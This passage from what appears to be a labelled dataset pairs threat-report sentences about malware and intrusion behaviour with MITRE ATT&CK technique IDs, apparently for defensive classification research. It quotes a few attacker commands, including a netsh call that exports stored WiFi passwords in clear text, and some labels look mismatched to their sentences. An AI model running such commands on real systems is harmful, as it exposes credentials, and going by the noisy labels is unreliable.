    "text": "PowerShell to connect to third-party file sharing\nsites to download an NGROK utility",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The initial beacon packet for  contains the operating system version and file system of the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike was used to enable RDP,",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim IP address MAC address as well as the victim account domain name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Freenki is used to gather information about the infected system and to download a subsequent stage payload",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "whoami /groups",
    "command": "",
    "labels": [
      "T1016",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can detect the username of the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Network Indicators​     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "used batch scripts to enumerate network information including information about trusts zones and the domain.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used a scheduled task for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Windows batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "removed certain files and replaced them so they could not be retrieved.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has created a service when it is installed on the victim machine.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject shellcode into a donor processes that is started in a suspended state.  has previously used RegAsm as a donor process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "leverages the Windows API calls: VirtualAlloc() WriteProcessMemory() and CreateRemoteThread() for process injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use various Linux API functions including those for execution and discovery.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete a file from the system.  deletes the app bundle and dropper after execution.(Citation: TrendMicro MacOS April 2018)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP and HTTPS to communicate with the C2 server.  can also act as a webserver and listen for inbound HTTP requests through an exposed API.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "identifies files and directories for collection by searching for specific file extensions or file modification time.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can gather a list of running processes by using .",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can download its code from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from user directories.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to load malicious DLLs.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has disabled Windows Defender to evade protections.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has maintained persistence through a scheduled task. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the IP address of a compromised machine.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to click on Office attachments with malicious macros embedded.(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: CERT-EE Gamaredon January 2021)(Citation: Microsoft Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute additional payloads on a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download malicious shellcode to compromised systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "deceive the user into thinking that the application has failed to execute, even as it silently continues the malicious execution in the background.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can set a Registry key to determine how long it has been installed and possibly to indicate the version number.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used various tools (such as Mimikatz and WCE) to perform credential dumping.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "processes which threat actors injected into:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A system info module in  gathers information on the victim hosts configuration.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "to steal Outlook data such as server, user, and password from POP3, SMPT, and IMAP registry keys",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "is capable of executing commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete files and directories on compromised hosts.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used `cmd.exe` for archiving data and deleting files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The GUID returned from the registry value",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "steals user files from local hard drives with file extensions that match a predefined list.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can download additional tools to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the IP address of the compromised machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS,",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The certutil.exe program downloads the WinRAR binary",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP for direct remote point-and-click access.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used valid VPN credentials to gain initial access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "downloads additional files from C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "enables concurrent Remote Desktop Protocol (RDP) sessions.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can list directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has sent spearphishing attachments attempting to get a user to click.(Citation: Proofpoint Leviathan Oct 2017)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "injects DLL files into iexplore.exe.(Citation: Lotus Blossom Jun 2015)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used `cmd.exe` for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP to move laterally to systems in the victim environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP/S for C2 using the Microsoft Graph API. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used batch scripts on victim's machines. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional files and payloads onto a compromised host following initial access.(Citation: Uptycs Confucius APT Jan 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can inject code into multiple processes on infected endpoints.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "downloads additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has deployed malware that has copied itself to the startup directory for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "injected themselves into Windows Media Player",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Get the total RAM size of compromised host by executing \"SELECT * FROM Win32_OperatingSystem\" and look for \"TotalVisibleMemorySize\"",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "\".bat\" files designed to disable Cisco AMP / Microsoft Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to enumerate files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect compromised host information including OS version PC name RAM size and CPU details.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Reflective PE injection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "They then opened an RDP connection back to the primary domain controller",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has looked for files in the user's home directory with wallet in their name using find.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "is a memory-only DLL that runs as a service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Conducting discovery indirectly via schedule tasks named “Windows Update”",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP GET requests in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It is capable of the following functions:  Collect file/folder/drive information Download files and additional malware Launch/terminate/enumerate process Update configuration data Delete files Inject code from files to other running process Utilize proxy Open reverse shell Run in passive mode — instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it  Once the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated the host machines IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has relied on victims to open a malicious attachment delivered via email.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "to search and identify accessible volumes on the targeted system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "running processes were reviewed",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download files from remote servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the hostname domain and IP of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks to persistently run VBScripts.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "schedules a network job to execute two minutes after host infection.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to identify running processes on the victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has a command to launch a command shell on the system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has been observed deleting its original launcher after installation.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The script performs process injection using the API such as OpenThread (to create a handle to an existing process), VirtualAlloc (memory allocation in the chosen process), and QueueUserAPC, the thread that the APC (Asynchronous Procedure Calls) is queued to has to enter an alertable state",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to obtain a listing of running processes (including loaded modules).",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Otherwise, it runs a search for the “/bin/rsyncd” string within the files found in the /etc/ folder",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "lists the running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "establishes a foothold by adding a link to the malware executable in the startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can change Internet Explorer settings to reduce warnings about malware activity.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can be used to delete files from the file system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has queried the registry for proxy server information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "persistence was achieved by creating a ‘Run’ key",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can gather system information such as computer names.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "runs the ipconfig /all command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "added a spoofed binary to the start-up folder for persistence.(Citation: Malwarebytes Higaisa 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has been observed dropping password grabber modules including . ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has executed PowerShell scripts via WMI.(Citation: Anomali MUSTANG PANDA October 2019)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "obtains the victim computer name and encrypts the information to send over its C2 channel.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can write itself to the Startup folder to gain persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "- There were two interesting sub-classes found inside Main Activity: Receiver and Sender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and execute files on a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "disable system defenses",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Process access to LSASS was observed, likely to dump credentials",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can create persistence by adding a shortcut in the CurrentVersion\\Run Registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "was executed via rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "URL parameter Sample data Description   c= Victim->Administrator Hostname and username   l= 192.168.1.100 Compromised system's IP address   o= 5,1,1,32 Windows major and minor version, coupled with architecture (32 v",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collects the user name from the victims machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "using NetWkstaGetInfo() API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has modified DNS resolvers to evade DNS monitoring tools.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "As LSASS dumps are nowadays recognized by the dump file itself",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "run from their interactive RDP session",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can copy itself into the current users Startup folder as Narrator.exe for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can load drivers by creating a new service using the `CreateServiceW` API.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors downloaded malware and tools onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "gathers a list of processes using the tasklist command and then is sent back to the control server.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "downloads three components from",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "checking on running tasks,",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "using the functions “SHGetFolderPathlW” and “CreateFileW”",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.(Citation: PWC Cloud Hopper April 2017)(Citation: Symantec Cicada November 2020)(Citation: District Court of NY APT10 Indictment December 2018)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "uses the tasklist and wmic process get Capture ExecutablePath commands to gather the processes running on the system.(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy May 2019)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This module allows the injection of a PE file into a remote or local process’s memory without writing it to disk",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional files and tools from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute netshcommands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors used the lolbin wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for communication to the control servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use the command-line utility cacls.exe to change file permissions.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "sends information to its hard-coded C2 including OS version service pack information processor speed system name and OS install date.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "hostnames",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "is capable of performing remote file transmission.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate fixed logical drives on a targeted system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "or delete files",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can download files to the victims machine.(Citation: Nccgroup Gh0st April 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used native OS commands to understand privilege levels and system details.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can delete files from a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "enumerates system information such as hostname, shares, and domain information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use stolen domain admin accounts to move laterally within a victim domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the team leveraged compromised workstation and domain admin accounts to execute a payload",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This line uses the ShellExecute method of the Shell.Application object to execute the downloaded file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the victim’s hostname is captured in this logon event",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Is this a Windows-only threat? Which versions of Windows are targeted? Poseidon is particularly focused on the Microsoft Windows operating system family, specifically customizing the infection method for each one so as to gather different information and hide its presence after the initial infection",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can upload data from the victim's machine to the C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows Registry modifications to specify a DLL payload.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "adds Registry Run keys to achieve persistence.(Citation: Symantec Dragonfly)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "task scheduling",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "uses WMIC to execute payloads. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload and download files to and from the infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "used PowerShell to download and execute",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails it attempts to add Registry Run keys.(Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can install a new service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can execute a task to download a file.(Citation: ESET Gazer Aug 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "that added an exclusion rule to Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the computer name and OS version from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "func_GetLanguageTimeZoneOsVersion()",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can create delete or modify a specified Registry key or value.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used a persistence module that stores the implant inside the Registry which executes at logon.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has commands to delete files and persistence mechanisms from the victim.(Citation: ESET Gazer Aug 2017)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Processor architecture",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A  tool has created new Registry keys under `HKEY_CURRENT_USER\\Software\\Classes\\` and `HKLM\\SYSTEM\\CurrentControlSet\\services`.(Citation: Nccgroup Emissary Panda May 2018)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Allows severe/high/moderate/low-level threats to execute",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "overwrites Explorers Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.(Citation: MalwareTech Power Loader Aug 2013)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the capability of deleting local files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "DeviceControl API methods",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has identified primary users currently logged in users sets of users that commonly use a system or inactive users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can collect then exfiltrate files from the compromised system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can perform dynamic DLL importing and API lookups using LoadLibrary and GetProcAddress on obfuscated strings.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "searches for and exfiltrates the following information:\nOS architecture\nBuilt-in admin\nDomain host name\nHostname\nLocal admin\nOperating system\nScreen resolution",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host’s WiFi profiles (settings and passwords) to %APPDATA%\\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder=\"%APPDATA%\" They then gather more network information with a call to ipconfig and arp -a",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete its malware entirely from the target system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The  payload has been injected into the `logagent.exe` and `rdpclip.exe` processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has been spread through malicious document lures.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has modified the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "provides a reverse shell on the victim.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses various API to perform behaviors such as executing payloads and performing local enumeration.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "host serial number",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has deployed a utility script named kill.bat to disable anti-virus.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "stops processes related to security and management software.(Citation: Dragos EKANS)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands and scripts through rundll32. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "searches through the drive containing the OS then all drive letters C through to Z for documents matching certain extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": " has uploaded files from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify running processes and associated plugins on an infected host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "sends them back to the server in POST request:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "ipconfig /all",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has been used to execute the ipconfig /all command on a victim system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "A variant of  hooks lsass.exe and lsass.exe then checks the Registry for the data value 'rdpproto' under the key SYSTEM\\CurrentControlSet\\Control\\Lsa Name.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "To move laterally on a victim network  has used credentials stolen from various systems on which it gathered usernames and password hashes.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "code(2343)\", MsgBoxStyle.Critical, null);     The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\\Users\\<username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
